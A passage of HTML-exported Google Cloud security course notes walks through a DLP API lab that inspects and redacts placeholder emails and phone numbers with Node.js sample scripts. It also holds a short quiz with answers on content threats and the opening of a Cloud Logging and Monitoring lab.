directory:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cd nodejs-docs-samples/dlp</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>There are several Node JS DLP sample programs in this folder. Before you run them, you need to install the dependencies.</span></p><ol start='' ><li><p><span>Run the following command to install the required dependencies:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">npm install @google-cloud/dlp</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">npm install yargs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">npm install mime@2.5.2</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='task-3-inspect-and-redact-sensitive-data'><span>Task 3. Inspect and redact sensitive data</span></h4><p><span>In this task, you inspect and mask sensitive information from the string also use the DLP API to redact sensitive data from an image.</span></p><h5 id='inspect-a-string-for-sensitive-information'><span>Inspect a string for sensitive information</span></h5><ol start='' ><li><p><span>In Cloud Shell run the command below. (If prompted, click </span><strong><span>Authorize</span></strong><span>.)</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">node inspectString.js $GCLOUD_PROJECT "My email address is joe@example.com."</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should receive the following output.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Findings:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  Info type: EMAIL_ADDRESS</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  Likelihood: LIKELY</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>The result shows what sensitive data was found, what type of information it is, and how certain the API is about that info type.</span></p><ol start='' ><li><p><span>In Cloud Shell, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">node inspectString.js $GCLOUD_PROJECT "My phone number is 555-555-5555."</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should receive the following output.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Findings:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  Info type: PHONE_NUMBER</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  Likelihood: VERY_LIKELY</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><ol start='' ><li><p><span>Feel free to experiment with different input to the </span><strong><span>inspectString.js</span></strong><span> program. For example, try passing in values like </span><code>1234-5678-9876-5432</code><span> or </span><code>123-45-6789</code><span>.</span></p></li></ol><h5 id='mask-sensitive-information-from-a-string'><span>Mask sensitive information from a string</span></h5><ul><li><p><span>In Cloud Shell, run the following command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">node deidentifyWithMask.js $GCLOUD_PROJECT "My phone number is 555-555-5555."</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should receive the following output.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">My phone number is ************.</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><h5 id='redact-sensitive-data-from-images'><span>Redact sensitive data from images</span></h5><p><span>You will now use the DLP API to redact sensitive data from an image.</span></p><ol start='' ><li><p><span>Right-click on the image below and select </span><strong><span>Save image as</span></strong><span>. Save it locally on your computer as </span><code>dlp-input.png</code><span>.</span></p></li></ol><p><img src="images\au1ucO0F7rzOgXmeZjuKq%2BO3TQsftlIdPT%2FIMpF7f%2B0%3D.png" referrerpolicy="no-referrer" alt="Image with sample text and an email address"></p><ol start='' ><li><p><span>In the bar above the terminal, click the button at the top right with three vertical dots and select </span><strong><span>Upload</span></strong><span>.</span></p></li></ol><p><img src="images\vo1KqPLevku8N4DrR8QQNGo2CgT90D5LVbF7O%2Fg%2FE24%3D" referrerpolicy="no-referrer" alt="Upload menu selection"></p><p><span>If </span><strong><span>Upload</span></strong><span> is not clickable (&quot;grayed out&quot;), then click </span><strong><span>Restart</span></strong><span>. After the Cloud Shell environment is restarted, the </span><strong><span>Upload</span></strong><span> Link should be active.</span></p><p><span>Execute these commands commands before starting the next step in the lab.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export GCLOUD_PROJECT=$DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Choose Files</span></strong><span>, select the downloaded </span><strong><span>dlp-input.png</span></strong><span> image file, and </span><strong><span>Upload</span></strong><span> it to Cloud Shell.</span></p></li><li><p><span>From </span><strong><span>Cloud Shell</span></strong><span>, click </span><strong><span>Open Editor</span></strong><span> . This will launch the Cloud Shell code editor, which includes a file browser.</span></p></li><li><p><span>In the Cloud Shell code editor, on the left, you should see the </span><strong><span>dlp-input.png</span></strong><span> file.</span></p></li><li><p><span>Click the </span><strong><span>dlp-input.png</span></strong><span> file to display the image and verify it was uploaded.</span></p></li><li><p><span>From </span><strong><span>Cloud Shell</span></strong><span>, click </span><strong><span>Open Terminal</span></strong><span> to return to the terminal window.</span></p></li><li><p><span>In the terminal, run the following command to redact the email address values from the image:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">node redactImage.js $GCLOUD_PROJECT ~/dlp-input.png "" EMAIL_ADDRESS ~/dlp-redacted.png</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Open </span><strong><span>Editor</span></strong><span>.</span></p></li><li><p><span>In the Cloud Shell code editor, on the left, click the </span><strong><span>dlp-redacted.png</span></strong><span> file.</span></p></li></ol><p><span>You will see the image with the domain name redacted.</span></p><p><img src="images\9gK7DmzeoUMro5IuFCXxSjIzAcDlgnyeyXeEOOvdKgU%3D" referrerpolicy="no-referrer" alt="Sample image has the email address redacted"></p><p><span>When calling the redact API, you specified </span><code>EMAIL_ADDRESS</code><span> as the infotype to redact. In the image, you should notice that the email address is no longer visible.</span></p><h4 id='congratulations-18'><span>Congratulations!</span></h4><p><span>In this lab, you did the following:</span></p><ul><li><p><span>Enabled the DLP API.</span></p></li><li><p><span>Installed the Node JS DLP API, and sample.</span></p></li><li><p><span>Inspected string data for sensitive data.</span></p></li><li><p><span>Redacted sensitive data from string data and images.</span></p></li></ul><p>&nbsp;</p><h3 id='quiz-24'><span>QUIZ</span></h3><ol start='' ><li><p><span>Which TWO of the following options are ways that Google Cloud automates for customers the mitigation of many content threats?</span></p></li></ol><ul><li><p><span>In Compute Engine, all files are scanned for ransomware type security breaches before uploading,</span></p></li><li><p><strong><span>In Google Drive, all files will undergo a malware scan prior to any file download or file sharing attempt.</span></strong></p><p><span>Correct! In addition, Google Safe Browsing and our Chrome browser protects users by identifying potentially dangerous links in email and showing warnings if users do click on them.</span></p></li><li><p><strong><span>Google has global visibility into malicious sites and content, and is able to warn incoming users of suspected malware.</span></strong></p><p><span>Correct! This ongoing insight makes detecting malware attacks very effective, and there is nothing for you to monitor or configure.</span></p><p>&nbsp;</p></li></ul><ol start='2' ><li><p><span>Which TWO of the following tools does Google Cloud make available to customers for the mitigation of content-related security threats?</span></p></li></ol><ul><li><p><span>Text Redaction API</span></p></li><li><p><strong><span>Cloud Data Loss Prevention API</span></strong></p><p><span>Correct! The DLP API can scan for, and redact, sensitive textual data from your files and incoming content.</span></p></li><li><p><span>Clean Data API</span></p></li><li><p><strong><span>Cloud Natural Language API</span></strong></p><p><span>Correct! The Natural Language API can help classify your content when used with other APIs, such as the Vision API.</span></p><p>&nbsp;</p></li></ul><ol start='3' ><li><p><span>Which TWO of the following statements are TRUE when speaking about content-related security threats?</span></p></li></ol><ul><li><p><span>Tracking and unmasking ransomware attackers, via incoming ransom payments, is usually not very difficult with today&#39;s modern banking systems.</span></p></li><li><p><strong><span>Ransomware is a type of malicious software exploit that threatens to publish or perpetually block access to data unless money is paid.</span></strong></p><p><span>Correct! Recent Google research shows cyber thieves have made at least 25 million dollars from ransomware in the last two years and this figure is expected to grow.</span></p></li><li><p><span>Public, user-supplied reviews, images, or videos are considered &quot;safe content&quot; and generally do not require additional security oversight.</span></p></li><li><p><strong><span>Screenshots or other images that are made public without redaction can trigger a content-related cyber attack threat.</span></strong></p><p><span>Correct! To complicate matters further, this is a type of security breach that is not always recognized.</span></p></li></ul><p>&nbsp;</p><h2 id='monitoring-logging-auditing-and-scanning'><span>Monitoring, Logging, Auditing and Scanning</span></h2><h3 id='lab---configuring-and-using-cloud-logging-and-cloud-monitoring'><span>LAB - Configuring and Using Cloud Logging and Cloud Monitoring</span></h3><h4 id='overview-22'><span>Overview</span></h4><p><span>In this lab, you will learn common configurations and uses of both </span><a href='https://cloud.google.com/logging'><span>Cloud Logging</span></a><span> and </span><a href='https://cloud.google.com/monitoring'><span>Cloud Monitoring</span></a><span>.</span></p><p><span>You will learn how to view logs with filtering mechanisms, export logs to BigQuery syncs, and create logging metrics. You will also learn how to use Cloud Monitoring to view consumption metrics and create dashboards..</span></p><h5 id='objectives-19'><span>Objectives</span></h5><p><span>In this lab, you will learn how to perform the following tasks:</span></p><ul><li><p><span>View logs using a variety of filtering mechanisms.</span></p></li><li><p><span>Exclude log entries and disable log ingestion.</span></p></li><li><p><span>Export logs and run reports against exported logs.</span></p></li><li><p><span>Create and report on logging metrics.</span></p></li><li><p><span>Use Cloud Monitoring to monitor different Google Cloud projects.</span></p></li><li><p><span>Create a metrics dashboard.</span></p></li></ul><h4 id='setup-and-requirements-19'><span>Setup and requirements</span></h4><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h5 id='activate-google-cloud-shell-9'><span>Activate Google Cloud Shell</span></h5><p><span>Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.</span></p><p><span>Google Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>In Cloud console, on the top right toolbar, click the Open Cloud Shell button.</span></p><p><img src="images\WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D" referrerpolicy="no-referrer" alt="Highlighted Cloud Shell icon"></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li></ol><p><span>It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your </span><em><span>PROJECT_ID</span></em><span>. For example:</span></p><p><img src="images\hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D" referrerpolicy="no-referrer" alt="Project ID highlighted in the Cloud Shell Terminal"></p><p><strong><span>gcloud</span></strong><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ul><li><p><span>You can list the active account name with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - 